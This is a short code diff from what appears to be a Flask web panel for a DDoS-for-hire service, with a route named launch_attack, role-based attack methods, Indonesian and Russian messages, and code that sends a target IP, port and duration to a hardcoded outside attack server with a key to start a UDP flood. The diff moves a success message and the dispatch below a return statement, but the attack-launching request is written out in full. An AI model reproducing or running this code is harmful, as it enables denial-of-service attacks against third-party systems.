@@ -166,12 +166,11 @@ def launch_attack():
     if method not in allowed_methods:
         flash('Method tidak valid untuk role kamu!', 'error')
         return redirect(url_for('index'))
-    
-    print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration}, Метод: {method}")
 
     flash('Aksi berhasil dijalankan!', 'success')
     return redirect(url_for('index'))
     
+    print(f"Успешная атака! Цель: {target}, Порт: {port}, Время: {duration}, Метод: {method}")
     if method == "UDPFLOOD":
         url = f"http://217.144.185.177:5000/attack?type=L4&ip={target}&port={port}&method={method}&time={duration}&key=kriskaUSDEGR454T"
         requests.get(url)
